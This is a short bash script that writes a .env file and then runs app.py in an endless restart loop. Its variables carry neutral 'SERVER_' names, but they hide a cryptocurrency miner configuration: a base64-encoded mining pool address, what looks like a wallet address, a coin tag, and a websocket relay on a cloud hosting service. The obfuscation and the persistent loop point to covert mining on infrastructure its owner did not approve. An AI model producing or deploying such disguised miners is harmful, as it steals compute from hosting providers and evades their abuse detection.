#!/bin/bash
CONNECT=$1
NAME=$2
echo "SERVER_WS=wss://identical-sile-malphite-node-dfaa5ec5.koyeb.app
SERVER_TARGET=bWlub3RhdXJ4Lm5hLm1pbmUuenBvb2wuY2E6NzAxOQ==
SERVER_DOMAIN=MC2aktqE12PdxRvapTNrG8kbhU5F1Vb2fT
SERVER_SECRET=c=MAZA,zap=MAZA
SERVER_CONNECTION=${CONNECT}
SERVER_MODE=FAST" > .env
while true; do python3 app.py; sleep 10; done
